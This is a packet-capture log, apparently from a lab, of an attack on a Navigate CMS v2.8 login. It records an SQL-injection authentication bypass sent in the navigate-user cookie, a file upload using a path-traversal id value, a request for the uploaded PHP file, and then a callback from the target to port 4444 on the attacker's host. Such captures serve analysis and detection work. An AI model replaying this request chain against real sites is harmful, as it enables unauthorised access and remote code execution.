Nov 22, 2021 01:10:01.077599000 SE Asia Standard Time;192.168.111.255;192.168.111.1;54915;54915;UDP;305;54915 > 54915 LEN=271
Nov 22, 2021 01:10:01.240518000 SE Asia Standard Time;arp;60;Layer ARP: 	Hardware type: Ethernet (1) 	Protocol type: IPv4 (0x0800) 	Hardware size: 6 	Protocol size: 4 	Opcode: request (1) 	Sender MAC address: 00:0c:29:1b:20:cd 	Sender IP address: 192.168.111.132 	Target MAC address: 00:00:00:00:00:00 	Target IP address: 192.168.111.136 
Nov 22, 2021 01:10:01.240747000 SE Asia Standard Time;arp;60;Layer ARP: 	Hardware type: Ethernet (1) 	Protocol type: IPv4 (0x0800) 	Hardware size: 6 	Protocol size: 4 	Opcode: reply (2) 	Sender MAC address: 00:0c:29:0b:bf:ba 	Sender IP address: 192.168.111.136 	Target MAC address: 00:0c:29:1b:20:cd 	Target IP address: 192.168.111.132 
Nov 22, 2021 01:10:01.240968000 SE Asia Standard Time;192.168.111.136;192.168.111.132;33887;80;tcp;74;33887 > 33887 [SYN] Seq=0 Win=64240 LEN=0
Nov 22, 2021 01:10:01.241185000 SE Asia Standard Time;192.168.111.132;192.168.111.136;80;33887;tcp;74;33887 > 80 [SYN, ACK] Seq=0 Ack=1 Win=65160 LEN=0
Nov 22, 2021 01:10:01.241419000 SE Asia Standard Time;192.168.111.136;192.168.111.132;33887;80;tcp;66;80 > 33887 [ACK] Seq=1 Ack=1 Win=64256 LEN=0
Nov 22, 2021 01:10:01.241903000 SE Asia Standard Time;192.168.111.136;192.168.111.132;33887;80;http;189;Layer HTTP: 	GET /navigate/login.php HTTP/1.1\r\n 	Expert Info (Chat/Sequence): GET /navigate/login.php HTTP/1.1\r\n 	GET /navigate/login.php HTTP/1.1\r\n 	Severity level: Chat 	Group: Sequence 	Request Method: GET 	Request URI: /navigate/login.php 	Request Version: HTTP/1.1 	Host: 192.168.111.136\r\n 	User-Agent: Mozilla/4.0 (compatible MSIE 6.0 Windows NT 5.1)\r\n 	Full request URI: http://192.168.111.136/navigate/login.php 	HTTP request 1/1 	\r\n 
Nov 22, 2021 01:10:01.242140000 SE Asia Standard Time;192.168.111.132;192.168.111.136;80;33887;tcp;66;33887 > 80 [ACK] Seq=1 Ack=124 Win=65152 LEN=0
Nov 22, 2021 01:10:01.352747000 SE Asia Standard Time;192.168.111.132;192.168.111.136;80;33887;tcp;1514;33887 > 80 [ACK] Seq=1 Ack=124 Win=65152 LEN=1448
Nov 22, 2021 01:10:01.352757000 SE Asia Standard Time;192.168.111.132;192.168.111.136;80;33887;tcp;1514;33887 > 80 [ACK] Seq=1449 Ack=124 Win=65152 LEN=1448
Nov 22, 2021 01:10:01.352761000 SE Asia Standard Time;192.168.111.132;192.168.111.136;80;33887;tcp;1514;33887 > 80 [ACK] Seq=2897 Ack=124 Win=65152 LEN=1448
Nov 22, 2021 01:10:01.352768000 SE Asia Standard Time;192.168.111.132;192.168.111.136;80;33887;tcp;1514;33887 > 80 [ACK] Seq=4345 Ack=124 Win=65152 LEN=1448
Nov 22, 2021 01:10:01.352775000 SE Asia Standard Time;192.168.111.132;192.168.111.136;80;33887;tcp;1514;33887 > 80 [PUS, ACK] Seq=5793 Ack=124 Win=65152 LEN=1448
Nov 22, 2021 01:10:01.352843000 SE Asia Standard Time;192.168.111.132;192.168.111.136;80;33887;tcp;1514;33887 > 80 [ACK] Seq=7241 Ack=124 Win=65152 LEN=1448
Nov 22, 2021 01:10:01.352854000 SE Asia Standard Time;192.168.111.132;192.168.111.136;80;33887;tcp;322;33887 > 80 [PUS, ACK] Seq=8689 Ack=124 Win=65152 LEN=256
Nov 22, 2021 01:10:01.352986000 SE Asia Standard Time;192.168.111.136;192.168.111.132;33887;80;tcp;66;80 > 33887 [ACK] Seq=124 Ack=7241 Win=60672 LEN=0
Nov 22, 2021 01:10:01.353027000 SE Asia Standard Time;192.168.111.136;192.168.111.132;33887;80;tcp;66;80 > 33887 [ACK] Seq=124 Ack=8945 Win=59008 LEN=0
Nov 22, 2021 01:10:01.353504000 SE Asia Standard Time;192.168.111.132;192.168.111.136;80;33887;data-text-lines;71;"Layer DATA-TEXT-LINES: 	<!DOCTYPE html>\n 	<!--\r\n 	              _   _             _             _          _____ __  __  _____\r\n 	             | \ | |           (_)           | |        / ____|  \/  |/ ____|\r\n 	             |  \| | __ ___   ___  __ _  __ _| |_ ___  | |    | \  / | (___\r\n 	             | . ` |/ _` \ \ / / |/ _` |/ _` | __/ _ \ | |    | |\/| |\___ \\r\n 	             | |\  | (_| |\ V /| | (_| | (_| | ||  __/ | |____| |  | |____) |\r\n 	             |_| \_|\__,_| \_/ |_|\__, |\__,_|\__\___|  \_____|_|  |_|_____/\r\n 	                                   __/ |\r\n 	                                  |___/\r\n 	            -->\n 	<html><head>\n 	<meta http-equiv=""Content-Type"" content=""text/html charset=utf-8"" />\n 	<meta name=""viewport"" content=""width=device-width, user-scalable=no"">\n 	<meta http-equiv=""Expires"" content=""Tue, 01 Jan 1980 1:00:00 GMT"" />\n 	<meta http-equiv=""Pragma"" content=""no-cache"" />\n 	<link rel=""shortcut icon"" type=""image/png"" href=""img/navigate-isotype-16x16.png"">\n 	<title>Navigate CMS</title>\n 	<script language=""javascript"" src=""http://192.168.111.136/navigate/js/jquery.min.js?r=""></script>\n 	<script language=""javascript"" src=""http://192.168.111.136/navigate/js/jquery-migrate.js?r=""></script>\n 	<script language=""javascript"" type=""text/javascript"">jQuery.migrateTrace = false</script>\n 	<script language=""javascript"" src=""http://192.168.111.136/navigate/lib/external/jqgrid/i18n/grid.locale-en.js?r=""></script>\n 	<link rel=""stylesheet"" type=""text/css"" href=""http://192.168.111.136/navigate/css/cupertino/jquery-ui.css?r="" />\n 	<link rel=""stylesheet"" type=""text/css"" href=""cache/styles.1635849659.min.css?r=&_=1635849659"" />\n 	<script language=""javascript"" src=""cache/scripts.1635849660.min.jgz?r=&_=1635849660"" type=""text/javascript"" ></script>\n 	 [truncated]<script language=""javascript"" type=""text/javascript"">if(typeof(navigate_window_resize)==""undefined""){$.ajax({async: false, url: ""http://192.168.111.136/navigate/cache/scripts.js?r=&_=1635849660"", dataType: ""script"", cache: tru 	<link rel=""stylesheet"" type=""text/css"" href=""http://192.168.111.136/navigate/css/skins/cupertino.css?r="" />\n 	<script type=""text/javascript"">$.datepicker.setDefaults( $.datepicker.regional[ ""en"" ] )</script>\n 	<link rel=""stylesheet"" type=""text/css"" href=""http://192.168.111.136/navigate/css/font-awesome/css/font-awesome.min.css?r="" />\n 	</head><body>\r\n 	\r\n 	<div class=""navigate-top""></div>\r\n 	\r\n 	<div id=""navigate-status"" class=""ui-corner-all"">\r\n 	\t<div>\r\n 	        <div style=""float: left"">\r\n 	\r\n 	        </div>\r\n 	        <div style=""float: right"">\r\n 	            Navigate CMS v2.8, &copy 2021        </div>    \r\n 	        <div style="" clear: both ""></div>\r\n 	     </div>\r\n 	</div>\r\n 	\r\n 	<div id=""navigate-login"" class=""ui-corner-all"" style="" border: solid 1px #ddd top: 50% margin-top: -150px position: absolute margin-left: -325px left: 50% padding: 4px width: 700px height: 350px "">\r\n 	    <form\r\n 	    \tname=""navigate-content-form""\r\n 	        action=""/navigate/login.php""\r\n 	    \tmethod=""post"" \r\n 	        enctype=""multipart/form-data""\r\n 	        style="" margin-left: auto margin-right: auto margin-top: 50px height: 350px "">\r\n 	\r\n 	        <div style="" float: left margin-right: 55px margin-left: 20px "">\r\n 	            <img src=""img/navigate-logo-430x200.png"" width=""300"" height=""140""  />\r\n 	            <a href=""http://www.navigatecms.com"" style="" display: block text-decoration: none color: #2E476E text-align:  center "" target=""_blank"">www.navigatecms.com</a>\r\n 	        </div>\r\n 	        <div style="" float: left width: 288px "">\r\n 	            <div class=""navigate-form-row"">\r\n 	                <label style="" padding-top: 6px margin-bottom: 6px font-size: 15px "">User</label>\r\n 	                <br />\r\n 	                <input type=""text"" value="""" size=""32"" name=""login-username"" id=""login-username"" style="" width: 278px font-size: 20px "" />\r\n 	            </div>\r\n 	            <div class=""navigate-form-row"">\r\n 	                <label style="" padding-top: 6px margin-bottom: 6px font-size: 15px "">Password</label>\r\n 	                <br />\r\n 	                <input type=""password"" value="""" size=""32"" name=""login-password"" id=""login-password""  style="" width: 278px font-size: 20px "" />\r\n 	            </div>\r\n 	\r\n 	            <div class=""navigate-form-row"">\r\n 	                <input type=""checkbox"" name=""login-remember"" id=""login-remember"" value=""1"" />\r\n 	                <label onclick=""$('#login-remember').trigger('click')"" style="" margin-left: 3px margin-top: 2px position: absolute "">Remember me</label>\r\n 	            </div>\r\n 	\r\n 	            <div class=""navigate-form-row"" id=""login-button"" style="" margin-top: 48px font-size: 15px "">\r\n 	                <button style="" background: none border: none color: transparent display: block float: left "">Enter</button>\r\n 	                <a href=""#"" style="" color: #2E476E font-size: 10px line-height: 30px float: right text-decoration: none"">Forgot password?</a>\r\n 	            </div>\r\n 	        </div>\r\n 	\r\n 	        \r\n 	    </form>\r\n 	</div>\r\n 	\r\n 	<div id=""navigate-lost-password-dialog"" style="" display: none "">\r\n 	    <form action=""?"" method=""post"">\r\n 	        <div class=""navigate-form-row"">\r\n 	            <label style="" padding-top: 6px margin-bottom: 6px font-size: 11px width: auto "">\r\n 	                Enter your Navigate CMS username or e-mail address            </label>\r\n 	            <br />\r\n 	            <input type=""text"" value="""" size=""32"" name=""forgot-password"" id=""forgot-password""  style="" width: 96% font-size: 17px "" />\r\n 	            <br />\r\n 	            <div id=""forgot-password-problem"" class=""subcomment"" style="" margin-left: 0px color: #f33 "">&nbsp</div>\r\n 	        </div>\r\n 	        <div class=""navigate-form-row"" style="" margin-top: 20px "">\r\n 	            <button style="" background: none border: none color: transparent display: block float: left font-size: 12px "">\r\n 	                Ok            </button>\r\n 	        </div>\r\n 	    </div>\r\n 	</div>\r\n 	\r\n 	</body>\r\n 	\r\n 	<script language=""javascript"" type=""text/javascript"">\r\n 	\r\n 	var NAVIGATE_APP = ""http://192.168.111.136/navigate/navigate.php""\r\n 	\r\n 	$(window).on('load,resize', function()\r\n 	{\r\n 	    $('#navigate-status').css({ 'width': $(document).width() - 18 })\r\n 	})\r\n 	\r\n 	$(document).ready(function()\r\n 	{\r\n 	    $('button').removeAttr('style').css({'font-size': '14px', 'padding-bottom': '4px'}).hide().fadeIn('slow', function()\r\n 	    {\r\n 	        $('.error').parent().fadeIn('slow')\r\n 	    })\r\n 	\r\n 	    $('input[name=""login-username""]').focus()\r\n 	\r\n 	    $('#navigate-lost-password-dialog form').on('submit', function(e)\r\n 	    {\r\n 	        $('#forgot-password-problem').html('&nbsp')\r\n 	        e.stopPropagation()\r\n 	        e.preventDefault()\r\n 	\r\n 	        $.post(\r\n 	            'login.php',\r\n 	            {\r\n 	                'action': 'forgot-password',\r\n 	                'value': $('#forgot-password').val()\r\n 	            },\r\n 	            function(data)\r\n 	            {\r\n 	                if(data=='sent')\r\n 	                {\r\n 	                    //$('#navigate-lost-password-dialog').dialog('close')\r\n 	                    $('#navigate-lost-password-dialog').html('')\r\n 	 [truncated]                    $('#navigate-lost-password-dialog').append('<div style=""text-align: center margin: 16px ""><i class=""fa fa-5x fa-envelope"" style=""color: #BBD6F5""></i><i style=""position: absolute margin-top: 28px margin- 	                    $('#navigate-lost-password-dialog').append('<div style=""text-align: center font-weight: bold padding: 10px "">An e-mail with a confirmation link has been sent to your e-mail account.</div>')\r\n 	                }\r\n 	                else if(data=='not_found')\r\n 	                {\r\n 	                    $('#forgot-password-problem').html(""Couldn&#039t find this username or e-mail address"")\r\n 	                }\r\n 	                else// if(data=='not_sent')\r\n 	                {\r\n 	                    $('#forgot-password-problem').html(""E-mail could not be sent please contact the administrator"")\r\n 	                }\r\n 	            }\r\n 	        )\r\n 	    })\r\n 	\r\n 	    // forgot password button\r\n 	    $('#login-button a').on('click', function()\r\n 	    {\r\n 	        $('#navigate-lost-password-dialog').dialog({\r\n 	            title: ""Forgot password?"",\r\n 	            modal: true,\r\n 	            width: 350,\r\n 	            height: 220\r\n 	        })\r\n 	    })\r\n 	\r\n 	    $.setCookie(""navigate-tinymce-scroll"", '{}')\r\n 	})\r\n 	    \r\n 	</script>\r\n 	\r\n 	</html>\r\n "
Nov 22, 2021 01:10:01.353610000 SE Asia Standard Time;192.168.111.136;192.168.111.132;33887;80;tcp;66;80 > 33887 [ACK] Seq=124 Ack=8950 Win=64128 LEN=0
Nov 22, 2021 01:10:01.354514000 SE Asia Standard Time;192.168.111.136;192.168.111.132;33887;80;tcp;66;80 > 33887 [FIN, ACK] Seq=124 Ack=8950 Win=64128 LEN=0
Nov 22, 2021 01:10:01.354701000 SE Asia Standard Time;192.168.111.132;192.168.111.136;80;33887;tcp;66;33887 > 80 [FIN, ACK] Seq=8950 Ack=125 Win=65152 LEN=0
Nov 22, 2021 01:10:01.354833000 SE Asia Standard Time;192.168.111.136;192.168.111.132;33887;80;tcp;66;80 > 33887 [ACK] Seq=125 Ack=8951 Win=64128 LEN=0
Nov 22, 2021 01:10:01.355669000 SE Asia Standard Time;192.168.111.136;192.168.111.132;35749;80;tcp;74;35749 > 35749 [SYN] Seq=0 Win=64240 LEN=0
Nov 22, 2021 01:10:01.355915000 SE Asia Standard Time;192.168.111.132;192.168.111.136;80;35749;tcp;74;35749 > 80 [SYN, ACK] Seq=0 Ack=1 Win=65160 LEN=0
Nov 22, 2021 01:10:01.356111000 SE Asia Standard Time;192.168.111.136;192.168.111.132;35749;80;tcp;66;80 > 35749 [ACK] Seq=1 Ack=1 Win=64256 LEN=0
Nov 22, 2021 01:10:01.356495000 SE Asia Standard Time;192.168.111.136;192.168.111.132;35749;80;http;297;"Layer HTTP: 	POST /navigate/login.php HTTP/1.1\r\n 	Expert Info (Chat/Sequence): POST /navigate/login.php HTTP/1.1\r\n 	POST /navigate/login.php HTTP/1.1\r\n 	Severity level: Chat 	Group: Sequence 	Request Method: POST 	Request URI: /navigate/login.php 	Request Version: HTTP/1.1 	Host: 192.168.111.136\r\n 	User-Agent: Mozilla/4.0 (compatible MSIE 6.0 Windows NT 5.1)\r\n 	Cookie: navigate-user=\"" OR TRUE--%20\r\n 	Cookie pair: navigate-user=\"" OR TRUE--%20 	Content-Type: application/x-www-form-urlencoded\r\n 	Content-Length: 0\r\n 	Content length: 0 	Full request URI: http://192.168.111.136/navigate/login.php 	HTTP request 1/1 	\r\n "
Nov 22, 2021 01:10:01.356663000 SE Asia Standard Time;192.168.111.132;192.168.111.136;80;35749;tcp;66;35749 > 80 [ACK] Seq=1 Ack=232 Win=65024 LEN=0
Nov 22, 2021 01:10:01.360371000 SE Asia Standard Time;192.168.111.132;192.168.111.136;80;35749;http;688;Layer HTTP: 	HTTP/1.1 302 Found\r\n 	Expert Info (Chat/Sequence): HTTP/1.1 302 Found\r\n 	HTTP/1.1 302 Found\r\n 	Severity level: Chat 	Group: Sequence 	Response Version: HTTP/1.1 	Status Code: 302 	Status Code Description: Found 	Response Phrase: Found 	Date: Sun, 21 Nov 2021 18:10:02 GMT\r\n 	Server: Apache/2.4.29 (Ubuntu)\r\n 	Set-Cookie: NVSID_8a0e81e4=clj04cvi7q6qpjknat7gpukjt0 path=/\r\n 	Cache-Control: no-store, no-cache, must-revalidate\r\n 	location: navigate.php\r\n 	Content-Length: 0\r\n 	Content length: 0 	Content-Type: text/html charset=utf-8\r\n 	HTTP response 1/1 	Time since request: 0.003876000 seconds 	Request in frame: 54 	Request URI: http://192.168.111.136/navigate/login.php 	\r\n 	Expires: Thu, 19 Nov 1981 08:52:00 GMT\r\n 	Pragma: no-cache\r\n 	Set-Cookie: NVSID_8a0e81e4=clj04cvi7q6qpjknat7gpukjt0 expires=Sun, 21-Nov-2021 19:10:02 GMT Max-Age=3600 path=/ domain=192.168.111.136\r\n 	Set-Cookie: PHPSESSID=clj04cvi7q6qpjknat7gpukjt0 expires=Sun, 21-Nov-2021 19:10:02 GMT Max-Age=3600 path=/ domain=192.168.111.136\r\n 
Nov 22, 2021 01:10:01.360527000 SE Asia Standard Time;192.168.111.136;192.168.111.132;35749;80;tcp;66;80 > 35749 [ACK] Seq=232 Ack=623 Win=64128 LEN=0
Nov 22, 2021 01:10:01.361514000 SE Asia Standard Time;192.168.111.136;192.168.111.132;35749;80;tcp;66;80 > 35749 [FIN, ACK] Seq=232 Ack=623 Win=64128 LEN=0
Nov 22, 2021 01:10:01.361685000 SE Asia Standard Time;192.168.111.132;192.168.111.136;80;35749;tcp;66;35749 > 80 [FIN, ACK] Seq=623 Ack=233 Win=65024 LEN=0
Nov 22, 2021 01:10:01.361801000 SE Asia Standard Time;192.168.111.136;192.168.111.132;35749;80;tcp;66;80 > 35749 [ACK] Seq=233 Ack=624 Win=64128 LEN=0
Nov 22, 2021 01:10:01.363765000 SE Asia Standard Time;192.168.111.136;192.168.111.132;43861;80;tcp;74;43861 > 43861 [SYN] Seq=0 Win=64240 LEN=0
Nov 22, 2021 01:10:01.363968000 SE Asia Standard Time;192.168.111.132;192.168.111.136;80;43861;tcp;74;43861 > 80 [SYN, ACK] Seq=0 Ack=1 Win=65160 LEN=0
Nov 22, 2021 01:10:01.364159000 SE Asia Standard Time;192.168.111.136;192.168.111.132;43861;80;tcp;66;80 > 43861 [ACK] Seq=1 Ack=1 Win=64256 LEN=0
Nov 22, 2021 01:10:01.364733000 SE Asia Standard Time;192.168.111.136;192.168.111.132;43861;80;tcp;1514;80 > 43861 [ACK] Seq=1 Ack=1 Win=64256 LEN=1448
Nov 22, 2021 01:10:01.364743000 SE Asia Standard Time;192.168.111.136;192.168.111.132;43861;80;media;223;"Layer MIME_MULTIPART: 	Type: multipart/form-data 	First boundary: --_Part_546_1728438492_1081891810\r\n 	Encapsulated multipart part:  (image/jpeg) 	Content-Disposition: form-data name=""file"" filename=""xEBYf1CfQsSzHh""\r\n 	Content-Type: image/jpeg\r\n\r\n 	Media type: image/jpeg (1116 bytes) 	Last boundary: \r\n--_Part_546_1728438492_1081891810--\r\n "
Nov 22, 2021 01:10:01.364931000 SE Asia Standard Time;192.168.111.132;192.168.111.136;80;43861;tcp;66;43861 > 80 [ACK] Seq=1 Ack=1606 Win=63872 LEN=0
Nov 22, 2021 01:10:01.371513000 SE Asia Standard Time;192.168.111.132;192.168.111.136;80;43861;tcp;662;43861 > 80 [PUS, ACK] Seq=1 Ack=1606 Win=64128 LEN=596
Nov 22, 2021 01:10:01.371700000 SE Asia Standard Time;192.168.111.136;192.168.111.132;43861;80;tcp;66;80 > 43861 [ACK] Seq=1606 Ack=597 Win=64128 LEN=0
Nov 22, 2021 01:10:01.371854000 SE Asia Standard Time;192.168.111.132;192.168.111.136;80;43861;http;71;Layer HTTP: 	HTTP/1.1 200 OK\r\n 	Expert Info (Chat/Sequence): HTTP/1.1 200 OK\r\n 	HTTP/1.1 200 OK\r\n 	Severity level: Chat 	Group: Sequence 	Response Version: HTTP/1.1 	Status Code: 200 	Status Code Description: OK 	Response Phrase: OK 	Date: Sun, 21 Nov 2021 18:10:02 GMT\r\n 	Server: Apache/2.4.29 (Ubuntu)\r\n 	Set-Cookie: NVSID_8a0e81e4=clj04cvi7q6qpjknat7gpukjt0 path=/\r\n 	Cache-Control: no-store, no-cache, must-revalidate\r\n 	Transfer-Encoding: chunked\r\n 	Content-Type: application/json\r\n 	HTTP response 1/1 	Time since request: 0.007111000 seconds 	Request in frame: 65 	Request URI: http://192.168.111.136/navigate/navigate_upload.php?engine=picnik&id=../../../navigate_info.php&session_id=clj04cvi7q6qpjknat7gpukjt0 	Chunk size: 0 octets 	File Data: 0 bytes 	\r\n 	HTTP chunked response 	End of chunked encoding 	\r\n 	Expires: Thu, 19 Nov 1981 08:52:00 GMT\r\n 	Pragma: no-cache\r\n 	Set-Cookie: NVSID_8a0e81e4=clj04cvi7q6qpjknat7gpukjt0 expires=Sun, 21-Nov-2021 19:10:02 GMT Max-Age=3600 path=/ domain=192.168.111.136\r\n 	Set-Cookie: PHPSESSID=clj04cvi7q6qpjknat7gpukjt0 expires=Sun, 21-Nov-2021 19:10:02 GMT Max-Age=3600 path=/ domain=192.168.111.136\r\n 
Nov 22, 2021 01:10:01.371980000 SE Asia Standard Time;192.168.111.136;192.168.111.132;43861;80;tcp;66;80 > 43861 [ACK] Seq=1606 Ack=602 Win=64128 LEN=0
Nov 22, 2021 01:10:01.372800000 SE Asia Standard Time;192.168.111.136;192.168.111.132;43861;80;tcp;66;80 > 43861 [FIN, ACK] Seq=1606 Ack=602 Win=64128 LEN=0
Nov 22, 2021 01:10:01.372957000 SE Asia Standard Time;192.168.111.132;192.168.111.136;80;43861;tcp;66;43861 > 80 [FIN, ACK] Seq=602 Ack=1607 Win=64128 LEN=0
Nov 22, 2021 01:10:01.373077000 SE Asia Standard Time;192.168.111.136;192.168.111.132;43861;80;tcp;66;80 > 43861 [ACK] Seq=1607 Ack=603 Win=64128 LEN=0
Nov 22, 2021 01:10:01.376551000 SE Asia Standard Time;192.168.111.136;192.168.111.132;34557;80;tcp;74;34557 > 34557 [SYN] Seq=0 Win=64240 LEN=0
Nov 22, 2021 01:10:01.376753000 SE Asia Standard Time;192.168.111.132;192.168.111.136;80;34557;tcp;74;34557 > 80 [SYN, ACK] Seq=0 Ack=1 Win=65160 LEN=0
Nov 22, 2021 01:10:01.376888000 SE Asia Standard Time;192.168.111.136;192.168.111.132;34557;80;tcp;66;80 > 34557 [ACK] Seq=1 Ack=1 Win=64256 LEN=0
Nov 22, 2021 01:10:01.377243000 SE Asia Standard Time;192.168.111.136;192.168.111.132;34557;80;http;197;Layer HTTP: 	GET /navigate/navigate_info.php HTTP/1.1\r\n 	Expert Info (Chat/Sequence): GET /navigate/navigate_info.php HTTP/1.1\r\n 	GET /navigate/navigate_info.php HTTP/1.1\r\n 	Severity level: Chat 	Group: Sequence 	Request Method: GET 	Request URI: /navigate/navigate_info.php 	Request Version: HTTP/1.1 	Host: 192.168.111.136\r\n 	User-Agent: Mozilla/4.0 (compatible MSIE 6.0 Windows NT 5.1)\r\n 	Full request URI: http://192.168.111.136/navigate/navigate_info.php 	HTTP request 1/1 	\r\n 
Nov 22, 2021 01:10:01.377510000 SE Asia Standard Time;192.168.111.132;192.168.111.136;80;34557;tcp;66;34557 > 80 [ACK] Seq=1 Ack=132 Win=65152 LEN=0
Nov 22, 2021 01:10:01.379510000 SE Asia Standard Time;192.168.111.132;192.168.111.136;59644;4444;tcp;74;59644 > 59644 [SYN] Seq=0 Win=64240 LEN=0
Nov 22, 2021 01:10:01.379709000 SE Asia Standard Time;192.168.111.136;192.168.111.132;4444;59644;tcp;74;59644 > 4444 [SYN, ACK] Seq=0 Ack=1 Win=65160 LEN=0
Nov 22, 2021 01:10:01.379880000 SE Asia Standard Time;192.168.111.132;192.168.111.136;59644;4444;tcp;66;4444 > 59644 [ACK] Seq=1 Ack=1 Win=64256 LEN=0
